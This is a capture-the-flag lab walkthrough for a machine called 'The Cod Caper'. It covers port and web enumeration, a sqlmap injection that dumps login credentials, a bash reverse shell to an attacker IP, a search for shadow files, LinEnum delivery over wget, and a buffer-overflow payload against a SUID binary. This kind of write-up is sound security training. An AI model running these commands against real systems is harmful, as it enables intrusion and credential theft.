# The Cod Caper


<details>
  <summary>Host Enumeration</summary>

### Host Enumeration

The first step is to see what ports and services are running on the target machine.

**🔹 Recommended tool:** `nmap`

#### Useful flags:

- `-p`  
  Used to specify which port to analyze. Can also specify a range of ports, e.g. `-p 1-1000`.

- `-sC`  
  Runs default scripts on the port — useful for basic analysis of the service running on a port.

- `-A`  
  Aggressive mode — goes all out to gather as much information as possible.


---

```bash
nmap -sCV 10.10.108.49
```

``Output``

```java
Nmap scan report for 10.10.108.49
Host is up (0.53s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.62 seconds
```

![image](https://github.com/user-attachments/assets/9ce2b1f0-4d29-4579-8124-88b380c49470)




  
</details>










<details>
  <summary>Web Enumeration</summary>


### Web Server Enumeration

Since the only services running are **SSH** and **Apache**, it is safe to assume that we should check out the web server first for possible vulnerabilities. One of the first things to do is to see what pages are available to access on the web server.

**🔹 Recommended tool:** `gobuster`

#### Useful flags:

- `-x`  
  Used to specify file extensions, e.g. `"php,txt,html"`.

- `--url`  
  Used to specify which URL to enumerate.

- `--wordlist`  
  Used to specify the wordlist that is appended to the URL path, e.g.:



---

```
gobuster dir -u http://10.10.108.49/ -w /home/kali/Downloads/wordlists/SecLists/Discovery/Web-Content/big.txt -x html,php,txt,bak -t 30
```

![image](https://github.com/user-attachments/assets/295ae41e-c3ef-4b2c-9536-160696262b01)




![image](https://github.com/user-attachments/assets/ba89a246-398d-4344-971d-664215e83f22)

![image](https://github.com/user-attachments/assets/d50560fb-708a-4bb3-990a-4c666232e558)


  
</details>





<details>
  <summary>Web Exploitation</summary>


### SQL Injection Testing

The admin page seems to give us a login form. In situations like this, it is always worth checking for **low-hanging fruit**. In the case of login forms, one of the first things to check for is **SQL Injection**.

**🔹 Recommended tool:** `sqlmap`

#### Useful flags:

- `-u`  
  Specifies which URL to attack.

- `--forms`  
  Automatically selects parameters from `<form>` elements on the page.

- `--dump`  
  Used to retrieve data from the database once SQL Injection is found.

- `-a`  
  Grabs just about everything from the database.



---


```
sqlmap -u http://Target_IP/administrator.php --dbs --forms
```

![image](https://github.com/user-attachments/assets/45c686fe-e118-42fe-a8ee-34d3ab3c3223)

```
sqlmap -r Request.txt -D users --tables users --dump
```

```
+------------+----------+
| password   | username |
+------------+----------+
| secretpass | pingudad |
+------------+----------+
```

![image](https://github.com/user-attachments/assets/2b9a5828-8faf-4bc8-9710-ad60c378b543)


![image](https://github.com/user-attachments/assets/7a52fbba-3378-4f87-ad45-47bffc08b505)

---

> after login

![image](https://github.com/user-attachments/assets/75a75609-2ec9-425d-8a12-a7899bf04bc5)


  
</details>










<details>
  <summary>Command Execution</summary>


### Post-Exploitation: Gaining Access

It seems we have gained the ability to run commands! Since this is my old PC, I should still have a user account. Let's run a few test commands, and then try to gain access!

---

#### Method 1: `nc` Reverse Shell

This machine has been outfitted with `nc`, a tool that allows you to make and receive connections and send data. It is one of the most popular tools to get a reverse shell.

➡ Some great places to find reverse shell payloads:  
- [HighOnCoffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

After this, you will need to do additional enumeration to find **pingu's SSH key** or **hidden password**.

---

#### Method 2: Hidden Passwords

Assuming my father hasn't modified the machine since he took over my old PC, I should still have my hidden password stored somewhere — I don’t recall though, so you'll have to find it!

**🔹 Recommended tool:** `find`  
Allows you to search for files a specific user owns.


---


```
bash -c 'bash -i >& /dev/tcp/10.8.47.102/4444 0>&1'
```

```
nc -lvnp 4444
```

![image](https://github.com/user-attachments/assets/51333772-af4e-41db-b561-9454386a80d4)

---

```
find / 2>>/dev/null | grep -i shadow
```


![image](https://github.com/user-attachments/assets/567b9ed5-4647-4b76-874a-76da2f133727)



To answer this question I've searched into the machine
the path is the following

> /var/hidden/pass


![image](https://github.com/user-attachments/assets/10eafadd-abe1-42b6-bc31-8abb5cac3202)

``password`` of pingu

```
pinguapingu
```
![image](https://github.com/user-attachments/assets/417a006d-4ade-489a-864e-ad7597a5da2d)


  
</details>



<details>
  <summary>LinEnum</summary>

### Privilege Escalation with LinEnum

`LinEnum` is a Bash script that searches for possible ways to escalate privileges. It is incredibly popular due to the sheer number of methods it checks for, and often LinEnum is one of the first things to try when you get shell access.

---

#### Methods to get LinEnum on the system

**🔹 Method 1: `scp`**

Since you have SSH access on the machine, you can use `scp` to copy files over.  
Example command:

```bash
scp /opt/LinEnum.sh pingu@10.10.10.10:/tmp
```


##🔹 Method 2: SimpleHTTPServer

> SimpleHTTPServer is a Python module that hosts a basic web server on your machine.
> Assuming the compromised machine can remotely download files, you can host LinEnum and download it.

on dir that have ``LinEnum``

```
python3 -m http.server 7777 
```

on server

```
wget http://10.8.47.102:7777/LinEnum.sh
```

---

```
chmod +x LinEnum.sh

./LinEnum.sh
```

![image](https://github.com/user-attachments/assets/250ffdea-f277-4cca-a3ba-28cc695a3eee)



  
</details>




<details>
  <summary>Pwndbg ⭕</summary>


# Simple Buffer Overflow Exploit Walkthrough

This document walks through a basic buffer overflow vulnerability to overwrite the Instruction Pointer (EIP) and control the program's execution flow.

## 1. Source Code Analysis

The vulnerability exists in the following C code, which contains a `get_input` function with a fixed-size buffer and a `shell` function that we aim to execute.

```c
#include "unistd.h"
#include "stdio.h"
#include "stdlib.h"

// This is the target function we want to execute.
void shell(){
    setuid(1000);
    setgid(1000);
    system("cat /var/backups/shadow.bak");
}

// This function is vulnerable to a buffer overflow.
void get_input(){
    char buffer[32]; // A buffer of only 32 bytes.
    scanf("%s", buffer); // No bounds checking, allowing more than 32 bytes to be written.
}

int main(){
    get_input();
}
```

The program expects 32 characters of input, but `scanf("%s", ...)` does not check the input length, creating a classic buffer overflow vulnerability.

## 2. Initial Investigation with GDB

To investigate the binary, we use GDB with the `pwndbg` plugin.

First, start GDB:
```sh
gdb /opt/secret/root
```
You should see the `pwndbg` interface initialize, indicating it's ready for debugging.

*_(Optional: You can add a screenshot of the GDB startup screen here)_*

## 3. Triggering the Vulnerability

Next, we test for the overflow by sending more data than the buffer can hold. We use the `cyclic` tool to generate a unique pattern of 50 characters. This makes it easy to determine which part of our input overwrites specific memory locations.

Run the program inside GDB with the cyclic input:
```gdb
r < <(cyclic 50)
```

The program will crash due to a **segmentation fault**. The `pwndbg` output shows the state of the registers at the time of the crash.

*_(Optional: You can add a screenshot of the GDB crash screen here, showing the overwritten EIP)_*

Notice that the **EIP** (Instruction Pointer) is overwritten with `0x6161616c`. This value is part of our cyclic input (`laaa`). Since we control EIP, we can redirect the program's execution to any location in memory, such as our `shell` function.

## 4. Calculating the Offset

The next step is to find out exactly how many characters it takes to overwrite the EIP. The unique pattern from `cyclic` allows us to calculate this offset easily.

Use `cyclic` with the `-l` flag and the value that overwrote EIP:
```sh
cyclic -l 0x6161616c
```

**Output:**
```
44
```

This result tells us that the first **44 bytes** of our input fill the buffer and overwrite other stack data, right up to the EIP. Therefore, the bytes that come *after* the first 44 will overwrite the EIP.

## 5. Conclusion

The pre-exploitation phase is complete. We have successfully identified:
1.  A buffer overflow vulnerability in the `get_input` function.
2.  That we can control the EIP register.
3.  The exact offset required to overwrite EIP is **44 bytes**.

The next step would be to craft a final exploit payload that consists of 44 bytes of padding followed by the memory address of the `shell` function.



---
---

✅ You have:

- A SUID binary: /opt/secret/root

- Source code of the binary

- A vulnerable buffer overflow (you can overwrite EIP / instruction pointer)

✅ Goal:

- Overwrite EIP to point to the shell() function and execute it to read /var/backups/shadow.bak as user pingu (UID 1000).


### 1️⃣ Open the binary in GDB with pwndbg

```
gdb /opt/secret/root
```

![image](https://github.com/user-attachments/assets/439762dc-e35f-4ce3-9143-5e760c3c40c3)


### 2️⃣ Run with cyclic input to crash it and find offset

```
r < <(cyclic 50)
```


### 3️⃣ Calculate the offset

```
cyclic -l 0x6161616c
```


### 4️⃣ Find shell() function address

```
p shell
```

You’ll get something like:

```
$1 = {<text address>} 0x080484b6
```

👉 Save that address (for example, 0x080484b6). That’s what we’ll overwrite EIP with!

### 5️⃣ Build the exploit payload

```
"A" * 44 + shell address
```

Example:

```
python3 -c 'print("A"*44 + "\xb6\x84\x04\x08")' | /opt/secret/root
```

⚠ Remember: Little-endian!
If shell = 0x080484b6, write it as \xb6\x84\x04\x08.


🛠 Summary of Commands

```
gdb /opt/secret/root
r < <(cyclic 50)
# Note crash address
cyclic -l 0x{crash address}
p shell
# Use address of shell in payload
python3 -c 'print("A"*44 + "\xb6\x84\x04\x08")' | /opt/secret/root
```

![image](https://github.com/user-attachments/assets/e6eb27f6-f59c-42e1-86b4-1634c88b4bca)

Perfect! Now that you got the Segmentation fault with the input of 50 "A"s, it means you successfully overflowed the buffer and crashed the program. 🎉

![image](https://github.com/user-attachments/assets/892ec506-dc99-4f6b-bde7-e3bdc84298b2)



  
</details>





































